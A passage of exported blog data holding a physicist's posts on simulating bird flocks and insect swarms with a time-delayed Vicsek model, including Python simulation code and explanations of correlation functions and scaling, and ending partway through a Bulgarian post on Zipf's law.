dtype=deque)\\nfor i in range(N):\\n    updtQueue[i] = deque()\\n\\"\\"\\"END INIT\\"\\"\\"\\n\\ndef timestep(particles, rand_vecs):\\n    \\n    # actual simulation timestep\\n    for i in range(len(particles)):\\n        \\n        # get neighbor indices for current particle\\n        neighbours = np.where(distances[i]<r)\\n        neighbours = neighbours[0][ np.where( neighbours[0] != i ) ]\\n        \\n        neighsDirs = rand_vecs[neighbours]\\n        \\n        # add neighbours\' directions to queue to be used after time delay interval\\n        updtQueue[i].append(neighsDirs)\\n        \\n        # if the queue is long enough, dequeue and change unit vector accordingly\\n        # otherwise continue on previous trajectory\\n        if(len(updtQueue[i]) > timeDelay):\\n            \\n            # get neighbours\' directions from before time delay interval\\n            neighsDirs = updtQueue[i].popleft()\\n            \\n            # get average direction vector of neighbours\\n            avg = np.mean([rand_vecs[i], *neighsDirs], axis=0)\\n            \\n            # apply the noise vector by rotating it to the axis of the particle vector\\n            newVec = noise_application(noiseWidth, avg)\\n            \\n            # move to new position \\n            updatePos[i,:] = updatePos[i,:] + delta_t * vel * newVec\\n            \\n            # get new unit vector vector\\n            updateVecs[i] = newVec\\n        else:\\n            # move to new position using old unit vector\\n            updatePos[i,:] = updatePos[i,:] + delta_t * vel * rand_vecs[i]\\n    \\n        # assure correct boundaries (xmax,ymax) = (box_size, box_size)\\n        if updatePos[i,0] < 0:\\n            updatePos[i,0] = box_size + updatePos[i,0]\\n    \\n        if updatePos[i,0] > box_size:\\n            updatePos[i,0] = updatePos[i,0] - box_size\\n    \\n        if updatePos[i,1] < 0:\\n            updatePos[i,1] = box_size + updatePos[i,1]\\n    \\n        if updatePos[i,1] > box_size:\\n            updatePos[i,1] = updatePos[i,1] - box_size\\n    \\n        if updatePos[i,2] < 0:\\n            updatePos[i,2] = box_size + updatePos[i,2]\\n    \\n        if updatePos[i,2] > box_size:\\n            updatePos[i,2] = updatePos[i,2] - box_size\\n            \\n    particles = updatePos\\n    rand_vecs = updateVecs\\n    \\n    return particles, rand_vecs\\n\\n\\"\\"\\"TIMESTEP AND THINGS TO DO WHEN VISITING\\"\\"\\"    \\n# Run until time ends\\ntimestr = time.strftime(\\"%Y%m%d-%H%M%S\\")\\nf = open( \'N{0}L{1}dt{2}T{3}_{4}.txt\'.format(N, box_size, timeDelay, T, timestr), \'a+\' )\\nwhile t < T:\\n    # print progress update and time spent on n steps\\n    if t%100 == 0:\\n        print (\\"step {} / {}: avg. time for 10 steps {:.3f}\\".format(\\n                t, T, (time.time()-timestepTime)/10\\n                ))\\n        timestepTime = time.time()\\n        \\n    \\"\\"\\"Timestep\\"\\"\\"\\n    \\n    # get all relative distances between particles before looking for neighbours\\n    distances = get_all_distances(particles, box_size)\\n    \\n    particles, rand_vecs = timestep(particles, rand_vecs)\\n    \\n    # export data and advance to new time step\\n    np.savetxt(f, particles, header=\'timestep {0}\'.format(t) )\\n    t += delta_t\\n    \\nelse:\\n    f.close()\\n```\\n\\nAnd we are done! We can now run our simulator from the terminal with something like python `main.py 128 6 2` to get the simulation for 128 particles, a box size of 6, and time delay value of 2. Voila! We have a Vicsek model simulator with added time delay, which will export particle positions. Now we can do all kinds of fun things, like visualise the motion of the particles, or do analysis on the data.\\n\\nNext time we will see what kind of statistical analysis we can do on those data, and for now I will leave you with a [link to a visualisation version of this model](https://codepen.io/tihawk/full/vPXebG), that you can play around with\\n\\nAnd [here](https://github.com/tihawk/vicsek_timedelay) you can see the full code of the simulator, together with the analysis part, and a script to run it, as well as a **Jupyter notebook** for visualising the analysis. We will discuss all of these in the next post.\\n\\nimport DonateCard from \'@site/src/components/DonateCard\';\\n\\n<DonateCard/>"},{"id":"further-introduction-to-how-do-birds-flock-and-insects-swarm","metadata":{"permalink":"/blog/further-introduction-to-how-do-birds-flock-and-insects-swarm","source":"@site/blog/2020-01-19-13:13:03further-introduction-to-how-do-birds-flock-and-insects-swarm.md","title":"How do birds flock and insects swarm: the Problem with current models","description":"Let\'s unravel how does the delay in a group of animals affect the group, and what should we understand under said delay (keyword: slowpoke). We\'ll see what problems can be spotted in previous research, and motivate ourselves to look for solutions.","date":"2020-01-19T00:00:00.000Z","formattedDate":"January 19, 2020","tags":[{"label":"Science","permalink":"/blog/tags/science"}],"readingTime":4.965,"hasTruncateMarker":true,"authors":[{"name":"Kiril Panayotov Blagoev","title":"Admin","url":"https://github.com/tihawk","imageURL":"https://github.com/tihawk.png","key":"kiroki"}],"frontMatter":{"slug":"further-introduction-to-how-do-birds-flock-and-insects-swarm","title":"How do birds flock and insects swarm: the Problem with current models","description":"Let\'s unravel how does the delay in a group of animals affect the group, and what should we understand under said delay (keyword: slowpoke). We\'ll see what problems can be spotted in previous research, and motivate ourselves to look for solutions.","authors":"kiroki","tags":["Science"]},"prevItem":{"title":"Simulating the Vicsek Model (with time delay) - How do birds flock and insects swarm","permalink":"/blog/simulating-the-vicsek-model-how-do-birds-flock-and-insects-swarm"},"nextItem":{"title":"How do birds flock and insects swarm: the Introduction","permalink":"/blog/introduction-to-how-do-birds-flock-and-insects-swarm"}},"content":"if you haven\'t seen the first part of this introduction, absolutely [go check it out](/blog/introduction-to-how-do-birds-flock-and-insects-swarm/) for context.\\n\\nIn this post we\'ll unravel how does the **delay** in a group of animals affect the group, and what should we understand under said delay (keyword: _slowpoke_). To get there, let\'s analyse the last two paragraphs of the introduction to my thesis, where we\'ll see what problems can be spotted in previous research, and motivate ourselves to look for solutions.\\n\\n\x3c!-- truncate --\x3e\\n\\n>  Both classic and dynamic scaling have previously been shown to work both for  [natural swarms](https://arxiv.org/pdf/1611.08201.pdf), as well as for the  [Vicsek model](https://iopscience.iop.org/article/10.1088/1478-3975/13/6/065001/meta). But when Cavagna et al. tried to compare the behaviour of natural swarms to that of the Vicsek model, two unexpected problems arose. First, in the relaxation of the spatio-temporal correlation function, non-dissipative modes were found in natural swarms, resulting in an underdamped correlation function. This suggests a sort of behavioural inertia in swarms, not present in the classic Vicsek model. The other difference comes in the value of the dynamic critical exponent $z$ resulting from testing the dynamic scaling hypothesis. For natural swarms $z$ assumes the value of approximately $1$, while for the Vicsek model $z\\\\approx2$.\\n\\nFirstly, there is research out there that concentrates on collecting data from real groups of animals that behave in a certain way. This data is then analysed with our friendly neighbourhood statistical tools, such as different correlation functions. Through that analysis a control parameter for that type of group is found - namely the **critical exponent**, which allows us to use the _scaling hypothesis_ to predict the behaviour of groups of different sizes, or other variables that we know the system depends on.\\n\\nSecondly, there is research that concentrates on trying to simulate the behaviour of these groups of animals using different models - like the _Vicsek model_, which we discussed previously. By simulating that data, we can then analyse it the same way as we would a real group of animals, and see if the results are similar, and if they differ - how exactly. This can tell us how to improve the model (and by extension our theories), and iterate again.\\n\\n<figure class=\\"kg-card kg-image-card kg-card-hascaption\\"><img src=\\"/content/images/2020/01/anattasi.png\\" class=\\"kg-image\\" alt loading=\\"lazy\\"/><figcaption>from <a href=\\"https://arxiv.org/abs/1611.08201\\">Dynamic scaling in natural swarms - Cavagna et al. (2017)</a></figcaption></figure>\\n\\nPrevious research of simulated data of the Vicsek model was promising, in the sense that for being such a simple model (we will discuss what the model actually entails in the next post) it still replicated many of the analysis results for different animal groups. But in recent research it started to deviate slightly from experimental data in two major ways. One way that it differs is in the shape of the dynamic correlation function. In experiment it suggests that when our old friend Alice the midge changes it\'s direction, Bob\'s trajectory changes as if it has inertia - it doesn\'t turn immediately to it\'s new trajectory according to Alice\'s, but instead takes a bit of time to readjust to its new direction. Meanwhile in the Vicsek model there is no such thing as inertia. Once Alice turns, Bob immediately acts and turns as well.\\n\\nAnother problem which arises (and could be connected to the previous one) is the calculated critical exponent - our control parameter for the scaling hypothesis. It takes on different values for the dynamic correlation function of experimental data versus our simulated Vicsek model data. By solving our first problem though, we can check whether our second problem gets better, worse, or maybe resolves itself.\\n\\n> Delay seems like an inevitable part of these biological systems. Even though some preliminary work has been done on the [2D Vicsek model](https://journals.aps.org/pre/abstract/10.1103/PhysRevE.100.012607) with time delay, the dynamical scaling hypothesis has not yet been tested on it, especially in three dimensions. The shape of the spatio-temporal correlation function in natural swarms suggests that adding a sensorial time delay to the change in direction of an individual particle in the Vicsek model could potentially simulate the behavioural inertia, and lead to results closer to those found in experiments. In this work, this hypothesis will be tested by modifying the update equations of the Vicsek model, and simulating it in the near-critical regime to get a new value for $z$ and observe any possible change in the shape of the correlation function.\\n\\nSo the question arises - how do we solve our lack-of-inertia problem in the Vicsek model? It has no inertia in its equations of motion after all. One possible thing to test is adding a **time delay** to the reaction of animals in the group to changes in its neighbours. What this means, is that when Alice turns, Bob continues to fly in its old trajectory for a set amount of time (time delay), and only when that time passes, does he turn to his newly decided direction. This can potentially simulate inertial behaviour, and we can test whether this new model still obeys the hypotheses of scale invariability. So let\'s make a plan of action:\\n\\n1. Change the Vicsek model\'s equations of motion so that they have time delay included in them\\n2. Simulate this new model for different system sizes and different values of time delay\\n3. Analyse that data, to see if it obeys the scaling hypothesis, and if the results are any closer to experiment than the ones of the standard Vicsek model\\n\\nSo, this is what we will discuss in the upcoming posts. We will see what the model is like, and discuss how one goes around to write a simulator for this model. This will be a mostly coding related post, where we concentrate on the technical aspects of computer simulations and statistical analysis. Lastly, we will discuss our results - the physics of it all. This will be our conclusion on the matter, where we see what our model revealed about the world of collective behaviour of natural systems.\\n\\nimport DonateCard from \'@site/src/components/DonateCard\';\\n\\n<DonateCard/>"},{"id":"introduction-to-how-do-birds-flock-and-insects-swarm","metadata":{"permalink":"/blog/introduction-to-how-do-birds-flock-and-insects-swarm","source":"@site/blog/2020-01-17-17:35:27introduction-to-how-do-birds-flock-and-insects-swarm.md","title":"How do birds flock and insects swarm: the Introduction","description":"Both flocks of birds and swarms of insects exhibit properties one would expect in an organised group of creatures, i.e. they know of each-other, and act accordingly.","date":"2020-01-17T00:00:00.000Z","formattedDate":"January 17, 2020","tags":[{"label":"Science","permalink":"/blog/tags/science"}],"readingTime":6.8,"hasTruncateMarker":true,"authors":[{"name":"Kiril Panayotov Blagoev","title":"Admin","url":"https://github.com/tihawk","imageURL":"https://github.com/tihawk.png","key":"kiroki"}],"frontMatter":{"slug":"introduction-to-how-do-birds-flock-and-insects-swarm","title":"How do birds flock and insects swarm: the Introduction","description":"Both flocks of birds and swarms of insects exhibit properties one would expect in an organised group of creatures, i.e. they know of each-other, and act accordingly.","authors":"kiroki","tags":["Science"]},"prevItem":{"title":"How do birds flock and insects swarm: the Problem with current models","permalink":"/blog/further-introduction-to-how-do-birds-flock-and-insects-swarm"},"nextItem":{"title":"\u0412 \u0442\u044a\u0440\u0441\u0435\u043d\u0435 \u043d\u0430 \u0417\u0438\u0444 \u0432\u044a\u0432 \u0412\u0438\u043a\u0438\u043f\u0435\u0434\u0438\u044f","permalink":"/blog/v-tyrsene-na-zif-vyv-wikipedia"}},"content":"Posts on the subject so far:\\n\\n1. [How do birds flock and insects swarm: the Introduction](/blog/introduction-to-how-do-birds-flock-and-insects-swarm/)\\n2. [How do birds flock and insects swarm: the Problem with current models](/blog/further-introduction-to-how-do-birds-flock-and-insects-swarm/)\\n3. [Simulating the Vicsek Model (with time delay) - How do birds flock and insects swarm](/blog/simulating-the-vicsek-model-how-do-birds-flock-and-insects-swarm/)\\n\\nIt\'s been my recent pleasure to work on a project (my thesis to be exact) which utilised Statistical Physics, to explore the emergent phenomena of flocking and swarming in natural systems. As past me had a stroke of creativity, I will let you enjoy his introduction to the subject - as seen in the finished thesis, interrupted by explanatory commentary:\\n\\n\x3c!-- truncate --\x3e\\n\\n> Quantifying and understanding the collective behaviour seen in the motion of biological groups, such as flocks and swarms, is an ongoing problem in statistical physics. The distinction has been made between collective motion in the ordered and disordered phase - i.e. flocks of birds and swarms of insects. Flocks are characterised by a strong polarisation - meaning they mostly move in the same direction. Meanwhile swarms have no preferred direction of motion, and have previously been argued not to be an example of collective behaviour. But with the help of statistical physics, swarms have been found to show strong correlation in their midst, and have sparked the idea, that the definition of collective behaviour could be the existence of such significant correlations.\\n\\nThis part is somewhat self-explanatory, but to recap: both **flocks** of birds and **swarms** of insects exhibit properties one would expect in an organised group of creatures, i.e. they know of each-other, and act accordingly. To some this may be counter-intuitive, as swarms seem random in their motion. But they do still stay in a group together, and don\'t bump into each-other. Upon careful statistical analysis, one can come to the conclusion, that they are indeed a correlated group - a word which here means, that the motion of each member depends on some or all other members in the group.\\n\\n>  The use of the [Vicsek model](https://en.wikipedia.org/wiki/Vicsek_model) as a tool to simulate collective behaviour has a long history. It is a very simplistic model, describing the individuals as self-propelled particles with a constant speed, whose direction is determined in the update equations by averaging the directions of its neighbours within some radius of influence. This model has proven useful in studying multiple types of collective behaviour, since it has a critical point connecting an ordered phase (where flocks of birds live), and a near-critical disordered phase (where evidence suggests swarms live). Hence [it has been used](https://arxiv.org/abs/1611.08201) to simulate the behaviour of swarms of flying insects such as midges.\\n\\nIn short, the Vicsek model allows us to simulate the motion of a bunch of little creatures, and by making them obey certain rules - see them exhibit emergent properties such as _flocking_ (them moving in the same direction in a group), or _swarming_ (the group stays mostly in the same position, but each member synchronises their motion with the group).\\n\\n![cover](/content/images/2020/01/cover.png)\\n\\n>  Statistical physics offers a useful concept of correlations, which can be applied to quantitatively analyse data from observed collective behaviour. Two types of correlations are particularly useful for the study of swarms. One is the (connected) static correlation function, which describes how much a change in a control parameter of an individual $i$ affects the change in a control parameter of an individual $j$. The other one is the dynamic, or in particular - the spatio-temporal correlation function. It allows to quantify how much changes of individual $i$ affect changes of individual $j$ at a later time - thus connecting spatial and temporal correlations.\\n\\nGoing more technical here. The only way to explain it in simpler terms is with an example. Let\'s say that there are two members - Alice the midge and Bob - the other midge. Alice and Bob are members of a group of midges flying together. Alice and Bob like to fly next to each-other, so that when Alice changes their direction, so does Bob (i.e. they are within each-other\'s radius of influence).\\n\\nNow suppose that at 12 o\'clock Alice makes a sharp 90 degree turn to the left. In the _static correlation function_ we measure how much does this change in Alice\'s direction affect the change in Bob\'s direction at the same time - 12:00. In the _dynamic correlation function_ we also measure that, but we also measure how much that same change of Alice\'s trajectory affected Bob\'s trajectory later down the line. We check how much did Bob change his direction at 12:00, 12:01, 12:02 and so on, and measure how much that change was affected by the initial turn of Alice at 12:00.\\n\\n<figure class=\\"kg-card kg-image-card kg-card-hascaption\\"><img src=\\"/content/images/2020/01/sea-water-nature-ocean-wave-lake-1033941-pxhere.com.jpg\\" class=\\"kg-image\\" alt loading=\\"lazy\\"/><figcaption>Schools of fish are also an example of collective behaviour</figcaption></figure>\\n\\n>  But the study of collective behaviour in biological systems goes a step further. Scaling is another very powerful concept in statistical physics. The [classical (static) scaling hypothesis](https://journals.aps.org/ppf/abstract/10.1103/PhysicsPhysiqueFizika.2.263) of Widom and Kadanoff presents the idea, that the only natural length scale of a system close to its critical point is the correlation length $\\\\xi$. The correlation length can be seen as a measure of the size of the correlated regions in a system. In other words - one might expect that the behaviour of a system depends in many convoluted ways on a variety of control parameters. Instead, the scaling hypothesis states, that the correlation functions depend on all of these parameters through the correlation length.\\n\\n> The [dynamic scaling hypothesis](https://journals.aps.org/pr/abstract/10.1103/PhysRev.177.952) formulated by Halperin and Hohenberg takes one step further, and establishes a connection between space and time: if the correlation length is large enough, both the characteristic timescale and the dynamic correlation function depend on the multitude of control parameters through the correlation length. In other words, these hypotheses describe a type of universality where, near criticality, scale invariance guarantees variables except the correlation length to drop out of the quantitative description of a system. [...]\\n\\nNow this is a powerful, albeit convoluted statement. The last two sentences are the meat of it all though. What we\'re saying here is that even if the behaviour of the system depends on things like group size, wind, temperature, sunshine, or you opening your window across the street - all we have to do is merge all of those effects into one parameter, apply this parameter to our random system, and our calculations will be valid for it, and any other system.\\n\\n\\n--------------------------------------------------------------------------------\\n\\nThe remainder of the introduction talks about the motivation behind my own work on the subject, and is indeed juicy. But this is already a lot of information to take in, so that part will be left for the next post.\\n\\n\\n--------------------------------------------------------------------------------\\n\\nNow, what did we learn by (hopefully) reading through this?\\n\\n* Both flocks and swarms are groups of creatures, the members of which are able to synchronise their motion with the rest of the group.\\n* The Vicsek model allows us to simulate such behaviour for the purposes of analysing it.\\n* We can analyse the behaviour of the group using correlation functions, and other statistical tools.\\n* Using the static correlation function, we can measure how much does the change in Alice\'s direction at $t=0$ affect Bob\'s direction at $t=0$.\\n* Using the dynamic correlation function, we can measure how much does the change in Alice\'s direction at $t=0$ affect Bob\'s direction at $t=0,1,2,3...$.\\n* If we have a system which depends in complex ways on a multitude of knobs and factors, we can combine those effects into a single parameter. This allows us to scale our system in whatever way we want, and still have our results for a random system be universally applicable. This is called the scaling hypothesis.\\n\\nAs a taste of what\'s to come, [next](/blog/further-introduction-to-how-do-birds-flock-and-insects-swarm/) we\'ll be looking into how the simulated data using the Vicsek model suggests that maybe the delay between Alice\'s turn and Bob\'s reaction affects the system.  [Then](/blog/simulating-the-vicsek-model-how-do-birds-flock-and-insects-swarm/) we\'ll dive into the technical aspect of simulating these flocks and swarms. And then maybe we\'ll review what the analysis of said data tells us.\\n\\nimport DonateCard from \'@site/src/components/DonateCard\';\\n\\n<DonateCard/>"},{"id":"v-tyrsene-na-zif-vyv-wikipedia","metadata":{"permalink":"/blog/v-tyrsene-na-zif-vyv-wikipedia","source":"@site/blog/2016-11-07-09:56:00v-tyrsene-na-zif-vyv-wikipedia.md","title":"\u0412 \u0442\u044a\u0440\u0441\u0435\u043d\u0435 \u043d\u0430 \u0417\u0438\u0444 \u0432\u044a\u0432 \u0412\u0438\u043a\u0438\u043f\u0435\u0434\u0438\u044f","description":"\u0418\u043d\u0442\u0440\u043e\u0434\u0443\u043a\u0446\u0438\u044f","date":"2016-11-07T00:00:00.000Z","formattedDate":"November 7, 2016","tags":[{"label":"\u041d\u0430\u0443\u043a\u0430","permalink":"/blog/tags/\u043d\u0430\u0443\u043a\u0430"},{"label":"Science","permalink":"/blog/tags/science"}],"readingTime":5.145,"hasTruncateMarker":true,"authors":[{"name":"Kiril Panayotov Blagoev","title":"Admin","url":"https://github.com/tihawk","imageURL":"https://github.com/tihawk.png","key":"kiroki"}],"frontMatter":{"slug":"v-tyrsene-na-zif-vyv-wikipedia","title":"\u0412 \u0442\u044a\u0440\u0441\u0435\u043d\u0435 \u043d\u0430 \u0417\u0438\u0444 \u0432\u044a\u0432 \u0412\u0438\u043a\u0438\u043f\u0435\u0434\u0438\u044f","authors":"kiroki","tags":["\u041d\u0430\u0443\u043a\u0430","Science"]},"prevItem":{"title":"How do birds flock and insects swarm: the Introduction","permalink":"/blog/introduction-to-how-do-birds-flock-and-insects-swarm"}},"content":"### \u0418\u043d\u0442\u0440\u043e\u0434\u0443\u043a\u0446\u0438\u044f\\n\\n\u041d\u0430\u0441\u043a\u043e\u0440\u043e \u0441\u0435 \u0437\u0430\u0438\u043d\u0442\u0435\u0440\u0435\u0441\u0443\u0432\u0430\u0445 \u043e\u0442 \u0435\u0434\u0438\u043d \u0438\u043d\u0442\u0435\u0440\u0435\u0441\u0435\u043d \u0437\u0430\u043a\u043e\u043d \u0437\u0430 \u0440\u0430\u0437\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u0438\u0435\u0442\u043e \u043d\u0430 \u0434\u0443\u043c\u0438\u0442\u0435 \u0438\u0437\u043f\u043e\u043b\u0437\u0432\u0430\u043d\u0438 \u0432 \u0434\u0430\u0434\u0435\u043d \u0435\u0437\u0438\u043a, \u043d\u0430\u0440\u0435\u0447\u0435\u043d \u0437\u0430\u043a\u043e\u043d\u044a\u0442 \u043d\u0430 [\u0417\u0438\u0444](https://en.wikipedia.org/wiki/Zipf%27s_law). \u0421\u043f\u043e\u0440\u0435\u0434 \u043d\u0435\u0433\u043e \u0447\u0435\u0441\u0442\u043e\u0442\u0430\u0442\u0430 \u043d\u0430 \u0443\u043f\u043e\u0442\u0440\u0435\u0431\u0430 \u043d\u0430 \u0434\u0443\u043c\u0438\u0442\u0435 \u0432 \u0434\u0430\u0434\u0435\u043d\u043e \u043f\u0440\u043e\u0438\u0437\u0432\u0435\u0434\u0435\u043d\u0438\u0435 \u0438\u043b\u0438 \u043f\u0440\u043e\u0441\u0442\u043e \u0441\u043c\u0438\u0441\u043b\u0435\u043d\u0430 \u043a\u043e\u043b\u0435\u043a\u0446\u0438\u044f \u0441\u043b\u0435\u0434\u0432\u0430 \u0435\u043a\u0441\u043f\u043e\u043d\u0435\u043d\u0446\u0438\u0430\u043b\u0435\u043d \u0437\u0430\u043a\u043e\u043d, \u0442.\u0435. \u0431\u0440\u043e\u044f\u0442 \u043d\u0430 \u0443\u043f\u043e\u0442\u0440\u0435\u0431\u0430 \u043d\u0430 \u0432\u0441\u044f\u043a\u0430 \u0441\u043b\u0435\u0434\u0432\u0430\u0449\u0430 \u0434\u0443\u043c\u0430 \u0432 \u0441\u043f\u0438\u0441\u044a\u043a\u0430 \u043e\u0442 \u0438\u0437\u043f\u043e\u043b\u0437\u0432\u0430\u043d\u0438 \u0442\u0430\u043a\u0438\u0432\u0430 \u043d\u0430\u043c\u0430\u043b\u044f \u0435\u043a\u0441\u043f\u043e\u043d\u0435\u043d\u0446\u0438\u0430\u043b\u043d\u043e \u0441\u043f\u0440\u044f\u043c\u043e \u043f\u0440\u0435\u0434\u0438\u0448\u043d\u0430\u0442\u0430. \u041f\u043e\u0441\u043b\u0435\u0434\u0441\u0442\u0432\u0438\u0435 \u043e\u0442 \u0442\u043e\u0432\u0430 \u0435, \u0447\u0435 \u0433\u043e\u0440\u0435 \u0434\u043e\u043b\u0443 \u0432\u044a\u0432 \u0432\u0441\u044f\u043a\u0430 \u0442\u0430\u043a\u0430\u0432\u0430 \u043a\u043e\u043b\u0435\u043a\u0446\u0438\u044f 80% \u043e\u0442 \u043e\u0431\u0435\u043c\u0430 \u0441\u0435 \u0441\u044a\u0441\u0442\u043e\u0438 \u043e\u0442 20% \u043e\u0442 \u0434\u0443\u043c\u0438\u0442\u0435, \u043f\u0440\u0438\u043d\u0446\u0438\u043f \u0438\u0437\u0432\u0435\u0441\u0442\u0435\u043d \u043a\u0430\u0442\u043e \u041f\u0440\u0438\u043d\u0446\u0438\u043f\u044a\u0442 \u043d\u0430 [\u041f\u0430\u0440\u0435\u0442\u043e](https://en.wikipedia.org/wiki/Pareto_principle).\\n\\n\x3c!-- truncate --\x3e\\n\\n\u041f\u0440\u0438\u0447\u0438\u043d\u0438\u0442\u0435 \u0437\u0430 \u0442\u043e\u0432\u0430 \u0441\u0435 \u0432\u043e\u0434\u044f\u0442 \u0432\u0441\u0435 \u043e\u0449\u0435 \u043d\u0435\u0438\u0437\u0432\u0435\u0441\u0442\u043d\u0438, \u043d\u043e \u0441\u0438 \u0441\u0442\u0440\u0443\u0432\u0430 \u0434\u0430 \u0441\u0435 \u043e\u0442\u0431\u0435\u043b\u0435\u0436\u0438, \u0447\u0435 \u0442\u0435\u043e\u0440\u0438\u0438 \u0441\u044a\u0449\u0435\u0441\u0442\u0432\u0443\u0432\u0430\u0442, \u0438 \u0438\u0437\u043d\u0438\u043a\u0432\u0430\u0442 \u043e\u0442 \u043c\u043d\u043e\u0433\u043e \u0440\u0430\u0437\u043b\u0438\u0447\u043d\u0438 \u043a\u043b\u043e\u043d\u043e\u0432\u0435 \u043d\u0430 \u043d\u0430\u0443\u043a\u0430\u0442\u0430 - \u0441\u0442\u0430\u0442\u0438\u0441\u0442\u0438\u043a\u0430, \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u043e\u043d\u043d\u0430 \u0442\u0435\u043e\u0440\u0438\u044f, \u043b\u0438\u043d\u0433\u0432\u0438\u0441\u0442\u0438\u043a\u0430, \u0441\u043e\u0446\u0438\u043e\u043b\u043e\u0433\u0438\u044f \u0438 \u0442.\u043d.\\n\\n\u0415\u0434\u0438\u043d \u043f\u0440\u0438\u043c\u0435\u0440 \u0435 \u0440\u0435\u0448\u0435\u043d\u0438\u0435 \u0437\u0430\u043b\u043e\u0436\u0435\u043d\u043e \u0432 \u043f\u0440\u0438\u043d\u0446\u0438\u043f\u0430 \u043d\u0430 \u043d\u0430\u0439-\u043c\u0430\u043b\u043a\u043e\u0442\u043e \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u0435: \u0433\u043e\u0432\u043e\u0440\u0435\u0449\u0438\u044f\u0442 \u0441\u0435 \u043e\u043f\u0438\u0442\u0432\u0430 \u0434\u0430 \u043c\u0438\u043d\u0438\u043c\u0430\u043b\u0438\u0437\u0438\u0440\u0430 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e\u0442\u043e \u0434\u0443\u043c\u0438, \u043a\u043e\u0438\u0442\u043e \u0438\u0437\u043f\u043e\u043b\u0437\u0432\u0430, \u0437\u0430 \u0434\u0430 \u043e\u0431\u044f\u0441\u043d\u0438 \u043d\u0435\u0449\u043e \u043d\u0430 \u0441\u043b\u0443\u0448\u0430\u0449\u0438\u044f. \u0421\u043b\u0443\u0448\u0430\u0449\u0438\u044f\u0442 \u0431\u0438 \u043f\u0440\u0435\u0434\u043f\u043e\u0447\u0435\u043b \u0434\u0430 \u0447\u0443\u0435 \u043f\u043e\u0432\u0435\u0447\u0435 \u0434\u0443\u043c\u0438 \u043e\u0431\u044f\u0441\u043d\u044f\u0432\u0430\u0449\u0438 \u0441\u0438\u0442\u0443\u0430\u0446\u0438\u044f\u0442\u0430, \u043c\u0438\u043d\u0438\u043c\u0430\u043b\u0438\u0437\u0438\u0440\u0430\u0439\u043a\u0438 \u0443\u0441\u0438\u043b\u0438\u0435\u0442\u043e \u043d\u0443\u0436\u043d\u043e \u0434\u0430 \u044f \u0440\u0430\u0437\u0431\u0435\u0440\u0435. \u0411\u0430\u043b\u0430\u043d\u0441 \u043c\u0435\u0436\u0434\u0443 \u0434\u0432\u0435\u0442\u0435 \u043c\u0438\u043d\u0438\u043c\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u0438 \u0441\u0435 \u043d\u0430\u043c\u0438\u0440\u0430 \u0442\u0430\u043c, \u043a\u044a\u0434\u0435\u0442\u043e \u043c\u0430\u043b\u043a\u043e \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043e\u0442 \u0434\u0443\u043c\u0438\u0442\u0435 \xa0(20%) \u0441\u0435 \u0438\u0437\u043f\u043e\u043b\u0437\u0432\u0430 \u0432 \u0433\u043e\u043b\u044f\u043c\u0430 \u0447\u0430\u0441\u0442 \u043e\u0442 \u0432\u0440\u0435\u043c\u0435\u0442\u043e (80%), \u0438 \u043e\u0441\u0442\u0430\u043d\u0430\u043b\u0438\u0442\u0435 20% \u043e\u0442 \u043e\u0431\u0435\u043c\u0430 \u0434\u0443\u043c\u0438 \u0441\u0435 \u0438\u0437\u043f\u043e\u043b\u0437\u0432\u0430 \u0441\u0430\u043c\u043e \u043f\u043e \u0432\u0435\u0434\u043d\u044a\u0436-\u0434\u0432\u0430\u0436, \u0437\u0430 \u0434\u0430 \u0434\u0430\u0434\u0435 \u043a\u043e\u043d\u043a\u0440\u0435\u0442\u043d\u0430 \u043f\u0440\u0435\u0434\u0441\u0442\u0430\u0432\u0430 \u0437\u0430 \u0447\u0430\u0441\u0442 \u043e\u0442 \u0441\u0438\u0442\u0443\u0430\u0446\u0438\u044f\u0442\u0430.\\n\\n\u041a\u0430\u0442\u043e \u0446\u044f\u043b\u043e \u043c\u0438 \u0441\u0435 \u0441\u0442\u0440\u0443\u0432\u0430, \u0447\u0435 \u0437\u0430 \u0434\u0430 \u0441\u0435 \u043f\u0440\u0438\u0434\u043e\u0431\u0438\u0435 \u043f\u043e-\u044f\u0441\u043d\u0430 \u043f\u0440\u0435\u0434\u0441\u0442\u0430\u0432\u0430 \u0437\u0430 \u0442\u043e\u0432\u0430 \u044f\u0432\u043b\u0435\u043d\u0438\u0435, \u0447\u043e\u0432\u0435\u043a \u0442\u0440\u044f\u0431\u0432\u0430 \u0434\u0430 \u0441\u0435 \u0437\u0430\u0434\u044a\u043b\u0431\u043e\u0447\u0438 \u0432 \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u043e\u043d\u043d\u0430\u0442\u0430 \u0442\u0435\u043e\u0440\u0438\u044f. \u0422\u0430\u043c \u0435\u043d\u0442\u0440\u043e\u043f\u0438\u044f\u0442\u0430 \u0441\u0435 \u0434\u0435\u0444\u0438\u043d\u0438\u0440\u0430 \u043a\u0430\u0442\u043e \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u044f - \u043a\u043e\u043b\u043a\u043e\u0442\u043e \u043f\u043e\u0432\u0435\u0447\u0435 \u0435\u043d\u0442\u0440\u043e\u043f\u0438\u044f, \u0442\u043e\u043b\u043a\u043e\u0432\u0430 \u043f\u043e\u0432\u0435\u0447\u0435 \u0443\u043d\u0438\u043a\u0430\u043b\u043d\u0430 \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u044f, \u043d\u043e \u0432 \u0434\u0430\u0434\u0435\u043d \u043c\u043e\u043c\u0435\u043d\u0442 \u0442\u0430\u0437\u0438 \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u044f \u0437\u0430\u043f\u043e\u0447\u0432\u0430 \u0434\u0430 \u0433\u0443\u0431\u0438 \u044f\u0441\u043d\u043e \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u0438 \u0441\u043c\u0438\u0441\u044a\u043b, \u043f\u0440\u0435\u0432\u0440\u044a\u0449\u0430\u0439\u043a\u0438 \u0441\u0435 \u0432 \u0431\u044f\u043b \u0448\u0443\u043c. \u041d\u0430 \u0435\u0434\u0438\u043d \u0447\u043e\u0432\u0435\u043a \u0435 \u043d\u0435\u043e\u0431\u0445\u043e\u0434\u0438\u043c \u0431\u0430\u043b\u0430\u043d\u0441 